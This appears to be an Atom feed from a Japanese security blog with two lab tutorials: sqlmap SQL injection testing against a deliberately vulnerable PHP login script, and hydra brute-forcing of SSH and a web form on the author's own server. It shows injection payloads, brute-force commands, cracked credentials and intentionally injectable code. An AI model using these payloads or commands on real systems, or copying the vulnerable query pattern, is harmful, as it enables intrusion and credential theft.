@@ -1,0 +1,816 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Security | seak0503 Blog]]></title>
+  <link href="http://blog.seak.jp.net/blog/categories/security/atom.xml" rel="self"/>
+  <link href="http://blog.seak.jp.net/"/>
+  <updated>2014-11-28T08:26:19+09:00</updated>
+  <id>http://blog.seak.jp.net/</id>
+  <author>
+    <name><![CDATA[seak0503]]></name>
+    <email><![CDATA[seak0503.gmail.com]]></email>
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[sqlmapでSQLインジェクションの検証]]></title>
+    <link href="http://blog.seak.jp.net/blog/2014/05/20/sqlmap/"/>
+    <updated>2014-05-20T07:35:25+09:00</updated>
+    <id>http://blog.seak.jp.net/blog/2014/05/20/sqlmap</id>
+    <content type="html"><![CDATA[<!-- more -->
+
+
+
+
+<h2>目次</h2>
+
+
+<p><ul>
+ <li><ul>
+  <li><a href="#L............">はじめに</a></li>
+  <li><a href="#L..................DB">対応しているDB</a></li>
+  <li><a href="#L...............SQL.................................">検知できるSQLインジェクションの種類</a></li>
+  <li><a href="#L............">検証環境</a></li>
+  <li><a href="#L.....................">攻撃対象サイト</a></li>
+  <li><a href="#sqlmap..................">sqlmapインストール</a></li>
+  <li><a href="#L.........">使い方</a></li>
+  <li><a href="#L........................">脆弱性診断をする</a></li>
+  <li><a href="#sqlmap.identified.the.following.injection.points.with.a.total.of.101.HTTP.s..requests:">sqlmap identified the following injection points with a total of 101 HTTP(s) requests:</a></li>
+  <li><a href="#L..........................................">データベースの一覧を取得する</a></li>
+  <li><a href="#L....................................">テーブルの一覧を取得する</a></li>
+  <li><a href="#L..................................users.............">テーブルデータのダンプ(usersテーブル)</a></li>
+  <li><a href="#L.........">最後に</a></li>
+ </ul></li>
+</ul>
+
+</p>
+
+<a name="L............"></a>
+<h2>はじめに</h2>
+
+<p>ここではpython製のツールである、sqlmapを使って
+SQLインジェクションの検証をします。</p>
+
+<p>検証目的ですので、自分でたてたテストサーバにSQLインジェクションを
+しかけます。</p>
+
+<a name="L..................DB"></a>
+<h2>対応しているDB</h2>
+
+<ul>
+<li>MySQL</li>
+<li>Oracle</li>
+<li>PostgreSQL</li>
+<li>Microsoft SQL Server</li>
+<li>Microsoft Access</li>
+<li>IBM DB2</li>
+<li>SQLite</li>
+<li>Firebird</li>
+<li>Sybase</li>
+<li>SAP MaxDB</li>
+</ul>
+
+
+<a name="L...............SQL................................."></a>
+<h2>検知できるSQLインジェクションの種類</h2>
+
+<ul>
+<li>boolean-based blind</li>
+<li>time-based blind</li>
+<li>error-based</li>
+<li>UNION query</li>
+<li>stacked queries</li>
+<li>out-of-band</li>
+</ul>
+
+
+<a name="L............"></a>
+<h2>検証環境</h2>
+
+<ul>
+<li><p>攻撃用サーバ(sqlmap実行側):</p>
+
+<ul>
+<li><p>OS: CentOS6.4 x86_64</p></li>
+<li><p>Python: python2.2.6</p></li>
+</ul>
+</li>
+<li><p>攻撃対象サーバ:</p>
+
+<ul>
+<li><p>OS: CentOS6.4 x86_64</p></li>
+<li><p>php: 5.3.2</p></li>
+<li><p>Apache: 2.2.25</p></li>
+<li><p>PostgreSQL: 9.2.5</p></li>
+</ul>
+</li>
+</ul>
+
+
+<a name="L....................."></a>
+<h2>攻撃対象サイト</h2>
+
+<p>下記のPHPスクリプトを用意しました。</p>
+
+<p>ログインフォーム(sql_injection-002.html):</p>
+
+<p><code>html
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;ログインしてください&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;form action="sql_injection-003.php" method="POST"&gt;
+ユーザ名&lt;input type="text" name="ID"&gt;&lt;br&gt;
+パスワード&lt;input type="text" name="PWD"&gt;&lt;br&gt;
+&lt;input type="submit" value="ログイン"&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></p>
+
+<p>ログイン処理スクリプト(sql_injection-003.php):</p>
+
+<p>```php
+&lt;?php
+  session_start();
+  header('Content-Type: text/html; charset=UTF-8');
+  $id = @$<em>POST['ID'];   // ユーザID
+  $pwd = @$</em>POST['PWD']; // パスワード
+  // データベースに接続しコネクションオブジェクトを生成
+  $con = pg_connect("host=localhost dbname=wasbook user=postgres password=wasbook");
+  // SQLの組み立て(プレースホルダは意図的に使用しない)
+  $sql = "SELECT * FROM users WHERE id ='$id' and PWD = '$pwd'";
+  $rs = pg_query($con, $sql);  // クエリー実行
+?>
+<html>
+<body>
+&lt;?php
+  if (pg_num_rows($rs) > 0) { // SELECTした行が存在する場合ログイン成功</p>
+
+<pre><code>$_SESSION['id'] = $id;
+echo 'ログイン成功です';
+</code></pre>
+
+<p>  } else {</p>
+
+<pre><code>echo 'ログイン失敗です';
+</code></pre>
+
+<p>  }
+  pg_close($con);
+?>
+</body>
+</html>
+```</p>
+
+<a name="sqlmap.................."></a>
+<h2>sqlmapインストール</h2>
+
+<p>GitHからリポジトリをフォークするだけです。</p>
+
+<p><code>bash
+$ git clone https://github.com/sqlmapproject/sqlmap.git
+$ cd sqlmap
+</code></p>
+
+<a name="L........."></a>
+<h2>使い方</h2>
+
+<p>他の方が説明をしてくれているので、ここでは細かい説明はしませんが、基本的なことだけ</p>
+
+<p>GETメソッドの場合の例:</p>
+
+<p><code>bash
+python sqlmap.py -u "http://example.jp/sql_injection-003.php?ID=1&amp;PWD=2"
+</code></p>
+
+<p>POSTメソッドの場合の例:</p>
+
+<p><code>bash
+python sqlmap.py -u "http://example.jp/sql_injection-003.php" --data "ID=1&amp;PWD=2"
+</code></p>
+
+<p>基本的なコマンド:</p>
+
+<table>
+<thead>
+<tr>
+<th align="left">コマンド(center)</th>
+<th align="left">説明(center)                                 </th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td align="left">--dbs           </td>
+<td align="left">データベースの一覧を取得</td>
+</tr>
+<tr>
+<td align="left">--tables        </td>
+<td align="left">テーブルの一覧を取得 </td>
+</tr>
+<tr>
+<td align="left">-D              </td>
+<td align="left">データベースの指定(PostgreSQLではサーチパス)</td>
+</tr>
+<tr>
+<td align="left">-T              </td>
+<td align="left">テーブルの指定</td>
+</tr>
+<tr>
+<td align="left">--colums        </td>
+<td align="left">-Tと一緒に使いテーブル定義を一覧</td>
+</tr>
+<tr>
+<td align="left">--dump          </td>
+<td align="left">-Tと一緒に使いテーブルデータをダンプ</td>
+</tr>
+</tbody>
+</table>
+
+
+<a name="L........................"></a>
+<h2>脆弱性診断をする</h2>
+
+<p>診断を開始します:</p>
+
+<p>```bash
+$ ./sqlmap.py -u "http://example.jp/sql_injection-003.php" --data="ID=1&amp;PWD=2" --dbms PostgreSQL</p>
+
+<pre><code>sqlmap/1.0-dev-67115ed - automatic SQL injection and database takeover tool
+http://sqlmap.org
+</code></pre>
+
+<p>[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</p>
+
+<p>[*] starting at 07:05:04</p>
+
+<p>[07:05:04] [WARNING] using '/home/shyamahira/.sqlmap/output' as the output directory
+[07:05:04] [INFO] testing connection to the target URL
+[07:05:04] [INFO] testing if the target URL is stable. This can take a couple of seconds
+[07:05:05] [INFO] target URL is stable
+[07:05:05] [INFO] testing if POST parameter 'ID' is dynamic
+[07:05:05] [WARNING] POST parameter 'ID' does not appear dynamic
+[07:05:05] [INFO] heuristic (basic) test shows that POST parameter 'ID' might be injectable (possible DBMS: 'PostgreSQL')
+[07:05:05] [INFO] testing for SQL injection on POST parameter 'ID'
+[07:05:05] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[07:05:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[07:05:05] [INFO] POST parameter 'ID' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable
+[07:05:05] [INFO] testing 'PostgreSQL inline queries'
+[07:05:05] [INFO] testing 'PostgreSQL > 8.1 stacked queries'
+[07:05:05] [WARNING] time-based comparison requires larger statistical model, please wait.....                                              <br/>
+[07:05:15] [INFO] POST parameter 'ID' seems to be 'PostgreSQL > 8.1 stacked queries' injectable
+[07:05:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[07:05:25] [INFO] POST parameter 'ID' seems to be 'PostgreSQL > 8.1 AND time-based blind' injectable
+[07:05:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[07:05:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[07:05:25] [WARNING] reflective value(s) found and filtering out
+[07:05:25] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[07:05:25] [INFO] target URL appears to have 6 columns in query
+```</p>
+
+<p>以下のように聞かれたら、Yで応答します:</p>
+
+<p><code>bash
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
+</code></p>
+
+<p>IDパラメータで脆弱性が検出されました:</p>
+
+<p><code>bash
+POST parameter 'ID' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+</code></p>
+
+<p>上記メッセージをyで応答し、処理を進めます:</p>
+
+<p><code>bash
+[07:10:07] [INFO] testing if POST parameter 'PWD' is dynamic
+[07:10:07] [WARNING] POST parameter 'PWD' does not appear dynamic
+[07:10:07] [INFO] heuristic (basic) test shows that POST parameter 'PWD' might be injectable (possible DBMS: 'PostgreSQL')
+[07:10:07] [INFO] testing for SQL injection on POST parameter 'PWD'
+[07:10:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[07:10:07] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[07:10:07] [INFO] POST parameter 'PWD' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable
+[07:10:07] [INFO] testing 'PostgreSQL inline queries'
+[07:10:07] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries'
+[07:10:17] [INFO] POST parameter 'PWD' seems to be 'PostgreSQL &gt; 8.1 stacked queries' injectable
+[07:10:17] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'
+[07:10:27] [INFO] POST parameter 'PWD' seems to be 'PostgreSQL &gt; 8.1 AND time-based blind' injectable
+[07:10:27] [INFO] testing 'Generic UNION query (60) - 1 to 20 columns'
+</code></p>
+
+<p>PWDパラメータで脆弱性が検出されました:</p>
+
+<p><code>bash
+POST parameter 'PWD' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+</code></p>
+
+<p>上記メッセージをyで応答し、処理を進めます:</p>
+
+<p>PWDとIDパラメータにerror-basedのSQLインジェクションの脆弱性があると診断診断されました:</p>
+
+<p>```bash</p>
+
+<a name="sqlmap.identified.the.following.injection.points.with.a.total.of.101.HTTP.s..requests:"></a>
+<h2>sqlmap identified the following injection points with a total of 101 HTTP(s) requests:</h2>
+
+<p>Place: POST
+Parameter: PWD</p>
+
+<pre><code>Type: error-based
+Title: PostgreSQL AND error-based - WHERE or HAVING clause
+Payload: ID=1&amp;PWD=2' AND 5991=CAST((CHR(113)||CHR(112)||CHR(99)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (5991=5991) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(117)||CHR(117)||CHR(113)) AS NUMERIC) AND 'iBQp'='iBQp
+
+Type: stacked queries
+Title: PostgreSQL &gt; 8.1 stacked queries
+Payload: ID=1&amp;PWD=2'; SELECT PG_SLEEP(5)--
+
+Type: AND/OR time-based blind
+Title: PostgreSQL &gt; 8.1 AND time-based blind
+Payload: ID=1&amp;PWD=2' AND 9601=(SELECT 9601 FROM PG_SLEEP(5)) AND 'oMeE'='oMeE
+</code></pre>
+
+<p>Place: POST
+Parameter: ID</p>
+
+<pre><code>Type: error-based
+Title: PostgreSQL AND error-based - WHERE or HAVING clause
+Payload: ID=1' AND 3272=CAST((CHR(113)||CHR(112)||CHR(99)||CHR(112)||CHR(113))||(SELECT (CASE WHEN (3272=3272) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(117)||CHR(117)||CHR(113)) AS NUMERIC) AND 'ahLa'='ahLa&amp;PWD=2
+
+Type: stacked queries
+Title: PostgreSQL &gt; 8.1 stacked queries
+Payload: ID=1'; SELECT PG_SLEEP(5)--&amp;PWD=2
+
+Type: AND/OR time-based blind
+Title: PostgreSQL &gt; 8.1 AND time-based blind
+Payload: ID=1' AND 3167=(SELECT 3167 FROM PG_SLEEP(5)) AND 'GbHI'='GbHI&amp;PWD=2
+</code></pre>
+
+<hr />
+
+<p>```</p>
+
+<p>ここではQuitで止めます:</p>
+
+<p><code>bash
+there were multiple injection points, please select the one to use for following injections:
+[0] place: POST, parameter: ID, type: Single quoted string (default)
+[1] place: POST, parameter: PWD, type: Single quoted string
+[q] Quit
+</code></p>
+
+<a name="L.........................................."></a>
+<h2>データベースの一覧を取得する</h2>
+
+<p>```bash
+$ ./sqlmap.py -u "http://example.jp/sql_injection-003.php" --data="ID=1&amp;PWD=2" --dbs
+～ 略 ～
+there were multiple injection points, please select the one to use for following injections:
+[0] place: POST, parameter: PWD, type: Single quoted string (default)　&lt;-ここでは0を選択する
+[1] place: POST, parameter: ID, type: Single quoted string
+[q] Quit</p>
+
+<p>～ 略 ～</p>
+
+<p>available databases [3]:
+[<em>] information_schema
+[</em>] pg_catalog
+[*] public</p>
+
+<p>[11:57:55] [INFO] fetched data logged to text files under '/home/shyamahira/.sqlmap/output/example.jp'</p>
+
+<p>[*] shutting down at 11:57:55
+```</p>
+
+<a name="L...................................."></a>
+<h2>テーブルの一覧を取得する</h2>
+
+<p>```bash
+$ ./sqlmap.py -u "http://example.jp/sql_injection-003.php" --data="ID=1&amp;PWD=2" --tables
+～ 略 ～
+there were multiple injection points, please select the one to use for following injections:
+[0] place: POST, parameter: PWD, type: Single quoted string (default)　&lt;-ここでは0を選択する
+[1] place: POST, parameter: ID, type: Single quoted string
+[q] Quit</p>
+
+<p>～ 略 ～</p>
+
+<p>Database: pg_catalog
+[42 tables]
++-------------------------+
+| pg_aggregate            |
+| pg_am                   |
+| pg_amop                 |
+| pg_amproc               |
+| pg_attrdef              |
+| pg_attribute            |
+| pg_auth_members         |
+| pg_authid               |
+| pg_cast                 |
+| pg_class                |
+| pg_constraint           |
+| pg_conversion           |
+| pg_database             |
+| pg_depend               |
+| pg_description          |
+| pg_enum                 |
+| pg_foreign_data_wrapper |
+| pg_foreign_server       |
+| pg_index                |
+| pg_inherits             |
+| pg_language             |
+| pg_largeobject          |
+| pg_listener             |
+| pg_namespace            |
+| pg_opclass              |
+| pg_operator             |
+| pg_opfamily             |
+| pg_pltemplate           |
+| pg_proc                 |
+| pg_rewrite              |
+| pg_shdepend             |
+| pg_shdescription        |
+| pg_statistic            |
+| pg_tablespace           |
+| pg_trigger              |
+| pg_ts_config            |
+| pg_ts_config_map        |
+| pg_ts_dict              |
+| pg_ts_parser            |
+| pg_ts_template          |
+| pg_type                 |
+| pg_user_mapping         |
++-------------------------+</p>
+
+<p>Database: information_schema
+[7 tables]
++-------------------------+
+| sql_features            |
+| sql_implementation_info |
+| sql_languages           |
+| sql_packages            |
+| sql_parts               |
+| sql_sizing              |
+| sql_sizing_profiles     |
++-------------------------+</p>
+
+<p>Database: public
+[4 tables]
++-------------------------+
+| books                   |
+| dummy                   |
+| test                    |
+| users                   |
++-------------------------+</p>
+
+<p>[12:06:06] [INFO] fetched data logged to text files under '/home/shyamahira/.sqlmap/output/example.jp'</p>
+
+<p>[*] shutting down at 12:06:06
+```</p>
+
+<a name="L..................................users............."></a>
+<h2>テーブルデータのダンプ(usersテーブル)</h2>
+
+<p>```bash
+$ ./sqlmap.py -u "http://example.jp/sql_injection-003.php" --data="ID=1&amp;PWD=2" -T users --dump
+～ 略 ～
+there were multiple injection points, please select the one to use for following injections:
+[0] place: POST, parameter: PWD, type: Single quoted string (default)　&lt;-ここでは0を選択する
+[1] place: POST, parameter: ID, type: Single quoted string
+[q] Quit</p>
+
+<p>～ 略 ～</p>
+
+<p>Database: public
+Table: users
+[3 entries]
++--------+--------------+----------+---------+--------------------+------+
+| id     | tel          | pwd      | addr    | mail               | name |
++--------+--------------+----------+---------+--------------------+------+
+| sato   | 045-123-4567 | password | 神奈川県横浜市 | sato@example.net   | 佐藤一志 |
+| tanaka | 03-1234-5678 | pass1    | 東京都港区三田 | takana@example.com | 山石京子 |
+| yamada | 046-123-4567 | pass1    | 神奈川県川崎市 | yamada@example.jp  | 山田太一 |
++--------+--------------+----------+---------+--------------------+------+</p>
+
+<p>[12:08:35] [INFO] table 'public.users' dumped to CSV file '/home/shyamahira/.sqlmap/output/example.jp/dump/public/users.csv'
+[12:08:35] [INFO] fetched data logged to text files under '/home/shyamahira/.sqlmap/output/example.jp'</p>
+
+<p>[*] shutting down at 12:08:35
+```</p>
+
+<a name="L........."></a>
+<h2>最後に</h2>
+
+<p>sqlmapを実行した時、攻撃対象にどんなアクセスが来ているかについては
+時間のある時に追記したいと思います。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[hydraでブルートフォースアタックをする]]></title>
+    <link href="http://blog.seak.jp.net/blog/2014/05/20/hydra/"/>
+    <updated>2014-05-20T07:35:10+09:00</updated>
+    <id>http://blog.seak.jp.net/blog/2014/05/20/hydra</id>
+    <content type="html"><![CDATA[<!-- more -->
+
+
+
+
+<h2>目次</h2>
+
+
+<p><ul>
+ <li><ul>
+  <li><a href="#L............">はじめに</a></li>
+  <li><a href="#hydra.....................">hydra対応プロトコル</a></li>
+  <li><a href="#L............">検証環境</a></li>
+  <li><a href="#L.....................">攻撃対象サイト</a></li>
+  <li><a href="#hydra..................">hydraインストール</a></li>
+ </ul></li>
+ <li><a href="#wget..http:..apt.sw.be.redhat.el6.en.x86_64.rpmforge.RPMS.libssh-0.4.6-1.el6.rf.x86_64.rpm.">wget "http://apt.sw.be/redhat/el6/en/x86_64/rpmforge/RPMS/libssh-0.4.6-1.el6.rf.x86_64.rpm"</a></li>
+ <li><a href="#wget..http:..apt.sw.be.redhat.el6.en.x86_64.rpmforge.RPMS.libssh-devel-0.4.6-1.el6.rf.x86_64.rpm.">wget "http://apt.sw.be/redhat/el6/en/x86_64/rpmforge/RPMS/libssh-devel-0.4.6-1.el6.rf.x86_64.rpm"</a></li>
+ <li><a href="#rpm.-ivh.libssh-0.4.6-1.el6.rf.x86_64.rpm">rpm -ivh libssh-0.4.6-1.el6.rf.x86_64.rpm</a></li>
+ <li><a href="#rpm.-ivh.libssh-devel-0.4.6-1.el6.rf.x86_64.rpm">rpm -ivh libssh-devel-0.4.6-1.el6.rf.x86_64.rpm</a></li>
+ <li><a href="#wget..http:..pkgs.fedoraproject.org.lookaside.extras.hydra.hydra-7.6.tar.gz.62af688a07830d505d227bdaaeff9e0a.hydra-7.6.tar.gz.">wget "http://pkgs.fedoraproject.org/lookaside/extras/hydra/hydra-7.6.tar.gz/62af688a07830d505d227bdaaeff9e0a/hydra-7.6.tar.gz"</a></li>
+ <li><a href="#tar.zxvf.hydra-7.6.tar.gz">tar zxvf hydra-7.6.tar.gz</a></li>
+ <li><a href="#cd.hydra-7.6.">cd hydra-7.6/</a></li>
+ <li><a href="#L..configure">./configure</a></li>
+ <li><a href="#make">make</a></li>
+ <li><a href="#make.install">make install</a></li>
+ <li><ul>
+  <li><a href="#L............">事前準備</a></li>
+ </ul></li>
+ <li><a href="#cat.userlist.txt">cat userlist.txt</a></li>
+ <li><a href="#cat.passlist.txt">cat passlist.txt</a></li>
+ <li><ul>
+  <li><a href="#ssh........................">sshブルートフォース</a></li>
+ </ul></li>
+ <li><a href="#hydra.-l.sec-demo.-P.passlist.txt.example.jp.ssh">hydra -l sec-demo -P passlist.txt example.jp ssh</a></li>
+ <li><ul>
+  <li><a href="#http................................................">httpログインフォームブルートフォース</a></li>
+ </ul></li>
+ <li><a href="#hydra.-L..........ID...................-P...................................http-post-form........:.........:............................">hydra -L ユーザID辞書ファイル -P パスワード辞書ファイル http-post-form 'パス:クエリ:ログイン失敗文字列'</a></li>
+ <li><a href="#hydra.-L.userlist.txt.-P.passlist.txt.example.jp.http-post-form...sql_injection-003.php:ID..USER..amp.PWD..PASS.:.........................">hydra -L userlist.txt -P passlist.txt example.jp http-post-form '/sql_injection-003.php:ID=^USER^&amp;PWD=^PASS^:ログイン失敗です'</a></li>
+ <li><ul>
+  <li><a href="#L.........">最後に</a></li>
+ </ul></li>
+</ul>
+
+</p>
+
+<a name="L............"></a>
+<h2>はじめに</h2>
+
+<p>hydra(ヒュドラ)というパスワードクラッカーを利用して
+ブルートフォースアタックの検証を実施しました。</p>
+
+<p>攻撃対象は自分で用意したwebサーバです。</p>
+
+<a name="hydra....................."></a>
+<h2>hydra対応プロトコル</h2>
+
+<ul>
+<li>ftp</li>
+<li>ssh</li>
+<li>http</li>
+<li>imap</li>
+<li>pop3</li>
+</ul>
+
+
+<a name="L............"></a>
+<h2>検証環境</h2>
+
+<ul>
+<li><p>攻撃用サーバ(sqlmap実行側):</p>
+
+<ul>
+<li><p>OS: CentOS6.4 x86_64</p></li>
+<li><p>Python: python2.2.6</p></li>
+</ul>
+</li>
+<li><p>攻撃対象サーバ:</p>
+
+<ul>
+<li><p>OS: CentOS6.4 x86_64</p></li>
+<li><p>php: 5.3.2</p></li>
+<li><p>Apache: 2.2.25</p></li>
+<li><p>PostgreSQL: 9.2.5</p></li>
+</ul>
+</li>
+</ul>
+
+
+<a name="L....................."></a>
+<h2>攻撃対象サイト</h2>
+
+<p>下記のPHPスクリプトを用意しました。</p>
+
+<p>ログインフォーム(sql_injection-002.html):</p>
+
+<p><code>html
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;ログインしてください&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;form action="sql_injection-003.php" method="POST"&gt;
+ユーザ名&lt;input type="text" name="ID"&gt;&lt;br&gt;
+パスワード&lt;input type="text" name="PWD"&gt;&lt;br&gt;
+&lt;input type="submit" value="ログイン"&gt;
+&lt;/form&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></p>
+
+<p>ログイン処理スクリプト(sql_injection-003.php):</p>
+
+<p>```php
+&lt;?php
+  session_start();
+  header('Content-Type: text/html; charset=UTF-8');
+  $id = @$<em>POST['ID'];   // ユーザID
+  $pwd = @$</em>POST['PWD']; // パスワード
+  // データベースに接続しコネクションオブジェクトを生成
+  $con = pg_connect("host=localhost dbname=wasbook user=postgres password=wasbook");
+  // SQLの組み立て(プレースホルダは意図的に使用しない)
+  $sql = "SELECT * FROM users WHERE id ='$id' and PWD = '$pwd'";
+  $rs = pg_query($con, $sql);  // クエリー実行
+?>
+<html>
+<body>
+&lt;?php
+  if (pg_num_rows($rs) > 0) { // SELECTした行が存在する場合ログイン成功</p>
+
+<pre><code>$_SESSION['id'] = $id;
+echo 'ログイン成功です';
+</code></pre>
+
+<p>  } else {</p>
+
+<pre><code>echo 'ログイン失敗です';
+</code></pre>
+
+<p>  }
+  pg_close($con);
+?>
+</body>
+</html>
+```</p>
+
+<a name="hydra.................."></a>
+<h2>hydraインストール</h2>
+
+<p>hydraインストール前に<code>libssh</code>と<code>libssh-devel</code>を事前にインストールしておきます。</p>
+
+<p>これをいれないと、hydraでsshのブルートフォースアタックが実行できません。</p>
+
+<p>ちなみに、<code>libssh</code>と<code>libssh-devel</code>はCentOS6の場合、<code>yum</code>でもインストールできますが
+hydraがサポートしているのが、CentOS6の標準リポジトリにはないバージョン<code>0.4.6</code>だった
+ため、rpmファイルをとってきて、手動でインストールしています。</p>
+
+<p>```bash</p>
+
+<a name="wget..http:..apt.sw.be.redhat.el6.en.x86_64.rpmforge.RPMS.libssh-0.4.6-1.el6.rf.x86_64.rpm."></a>
+<h1>wget "http://apt.sw.be/redhat/el6/en/x86_64/rpmforge/RPMS/libssh-0.4.6-1.el6.rf.x86_64.rpm"</h1>
+
+<a name="wget..http:..apt.sw.be.redhat.el6.en.x86_64.rpmforge.RPMS.libssh-devel-0.4.6-1.el6.rf.x86_64.rpm."></a>
+<h1>wget "http://apt.sw.be/redhat/el6/en/x86_64/rpmforge/RPMS/libssh-devel-0.4.6-1.el6.rf.x86_64.rpm"</h1>
+
+<a name="rpm.-ivh.libssh-0.4.6-1.el6.rf.x86_64.rpm"></a>
+<h1>rpm -ivh libssh-0.4.6-1.el6.rf.x86_64.rpm</h1>
+
+<a name="rpm.-ivh.libssh-devel-0.4.6-1.el6.rf.x86_64.rpm"></a>
+<h1>rpm -ivh libssh-devel-0.4.6-1.el6.rf.x86_64.rpm</h1>
+
+<p>```</p>
+
+<p>次にhydraをインストールします。</p>
+
+<p>```bash</p>
+
+<a name="wget..http:..pkgs.fedoraproject.org.lookaside.extras.hydra.hydra-7.6.tar.gz.62af688a07830d505d227bdaaeff9e0a.hydra-7.6.tar.gz."></a>
+<h1>wget "http://pkgs.fedoraproject.org/lookaside/extras/hydra/hydra-7.6.tar.gz/62af688a07830d505d227bdaaeff9e0a/hydra-7.6.tar.gz"</h1>
+
+<a name="tar.zxvf.hydra-7.6.tar.gz"></a>
+<h1>tar zxvf hydra-7.6.tar.gz</h1>
+
+<a name="cd.hydra-7.6."></a>
+<h1>cd hydra-7.6/</h1>
+
+<a name="L..configure"></a>
+<h1>./configure</h1>
+
+<a name="make"></a>
+<h1>make</h1>
+
+<a name="make.install"></a>
+<h1>make install</h1>
+
+<p>```</p>
+
+<a name="L............"></a>
+<h2>事前準備</h2>
+
+<p>ユーザIDとパスワードの辞書を用意します。</p>
+
+<p>辞書生成ツールを使ってもいいですが、ここでは手動で以下のファイルを作成しました。</p>
+
+<p>ユーザID(userlist.txt):</p>
+
+<p>```bash</p>
+
+<a name="cat.userlist.txt"></a>
+<h1>cat userlist.txt</h1>
+
+<p>administrator
+anonymous
+corporatename
+yamada &lt;-これがwebフォームログイン用のユーザID
+email
+guest
+root
+testuser
+uniqueid
+user
+```</p>
+
+<p>パスワード(passlist.txt):</p>
+
+<p>```bash</p>
+
+<a name="cat.passlist.txt"></a>
+<h1>cat passlist.txt</h1>
+
+<p>1234
+address
+adminpass
+password
+rootpass
+qwerty
+testtest
+zipcode
+abcde &lt;-これがsshログイン用のパスワード
+pass1 &lt;-これがwebフォームログイン用のパスワード
+```</p>
+
+<a name="ssh........................"></a>
+<h2>sshブルートフォース</h2>
+
+<p>構文:</p>
+
+<p><code>bash
+hydra -l [ユーザ名] -P [パスワード辞書ファイル] [対象サーバ名/対象サーバIPアドレス] ssh
+</code></p>
+
+<p>実行例:</p>
+
+<p>```bash</p>
+
+<a name="hydra.-l.sec-demo.-P.passlist.txt.example.jp.ssh"></a>
+<h1>hydra -l sec-demo -P passlist.txt example.jp ssh</h1>
+
+<p>Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>
+
+<p>Hydra (http://www.thc.org/thc-hydra) starting at 2014-05-20 12:50:54
+[DATA] 10 tasks, 1 server, 10 login tries (l:1/p:10), ~1 try per task
+[DATA] attacking service ssh on port 22
+[22][ssh] host: 203.216.196.223   login: sec-demo   password: abcde &lt;-成功している
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2014-05-20 12:50:56
+```</p>
+
+<a name="http................................................"></a>
+<h2>httpログインフォームブルートフォース</h2>
+
+<p>構文(postの場合):</p>
+
+<p>```bash</p>
+
+<a name="hydra.-L..........ID...................-P...................................http-post-form........:.........:............................"></a>
+<h1>hydra -L [ユーザID辞書ファイル] -P [パスワード辞書ファイル] [対象サーバ名/対象サーバIPアドレス] http-post-form 'パス:クエリ:ログイン失敗文字列'</h1>
+
+<p>```</p>
+
+<p>実行例:</p>
+
+<p>```bash</p>
+
+<a name="hydra.-L.userlist.txt.-P.passlist.txt.example.jp.http-post-form...sql_injection-003.php:ID..USER..amp.PWD..PASS.:........................."></a>
+<h1>hydra -L userlist.txt -P passlist.txt example.jp http-post-form '/sql_injection-003.php:ID=^USER^&amp;PWD=^PASS^:ログイン失敗です'</h1>
+
+<p>Hydra v7.6 (c)2013 by van Hauser/THC &amp; David Maciejak - for legal purposes only</p>
+
+<p>Hydra (http://www.thc.org/thc-hydra) starting at 2014-05-20 13:11:56
+[DATA] 16 tasks, 1 server, 100 login tries (l:10/p:10), ~6 tries per task
+[DATA] attacking service http-post-form on port 80
+[80][www-form] host: 203.216.196.223   login: yamada   password: pass1 &lt;-成功している
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2014-05-20 13:11:57
+```</p>
+
+<a name="L........."></a>
+<h2>最後に</h2>
+
+<p>httpログインフォームのブルートフォースアタックで、ログイン成功文字列を指定する方法を知りたい、、、</p>
+]]></content>
+  </entry>
+  
+</feed>
